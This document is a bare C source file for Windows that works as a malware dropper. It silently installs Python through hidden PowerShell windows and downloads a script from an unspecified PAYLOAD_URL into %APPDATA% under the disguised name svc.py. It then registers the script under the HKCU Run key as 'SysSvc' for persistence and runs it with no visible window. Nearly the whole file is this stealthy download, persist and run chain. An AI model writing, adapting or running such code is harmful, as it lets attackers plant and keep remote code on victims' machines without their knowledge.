#include <windows.h>
#include <stdio.h>

int main(void) {
    char path[MAX_PATH];
    DWORD result = SearchPath(NULL, "python.exe", NULL, MAX_PATH, path, NULL);

    if (result == 0) {
        const char *install_cmd =
            "powershell -NoProfile -WindowStyle Hidden -Command \""
            "$u='https://www.python.org/ftp/python/3.12.7/python-3.12.7-amd64.exe';"
            "$o=\\\"$env:TEMP\\\\py_setup.exe\\\";"
            "Invoke-WebRequest -Uri $u -OutFile $o -UseBasicParsing;"
            "Start-Process -FilePath $o -ArgumentList '/quiet InstallAllUsers=0 PrependPath=1 Include_pip=1' -Wait;"
            "Remove-Item $o -Force\"";

        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessA(NULL, (LPSTR)install_cmd, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        char userProfile[MAX_PATH];
        if (GetEnvironmentVariableA("USERPROFILE", userProfile, MAX_PATH) == 0) return 1;

        char pyExe[MAX_PATH];
        snprintf(pyExe, MAX_PATH, "%s\\AppData\\Local\\Programs\\Python\\Python312\\python.exe", userProfile);

        char dl_cmd[MAX_PATH * 8];
        snprintf(dl_cmd, sizeof(dl_cmd),
            "powershell -NoProfile -WindowStyle Hidden -Command \""
            "Invoke-WebRequest -Uri '%s' "
            "-OutFile \\\"$env:APPDATA\\\\Microsoft\\\\svc.py\\\" -UseBasicParsing\"",
            PAYLOAD_URL);

        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessA(NULL, dl_cmd, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        char regCmd[MAX_PATH * 8];
        snprintf(regCmd, sizeof(regCmd),
            "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" "
            "/v SysSvc /t REG_SZ /d \"\\\"%s\\\" \\\"%%APPDATA%%\\Microsoft\\svc.py\\\"\" /f",
            pyExe);

        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessA(NULL, regCmd, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        char runCmd[MAX_PATH * 8];
        snprintf(runCmd, sizeof(runCmd),
            "\"%s\" \"%%APPDATA%%\\Microsoft\\svc.py\"", pyExe);

        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        CreateProcessA(NULL, runCmd, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    } else {
        printf("a");
    }
    return 0;
}
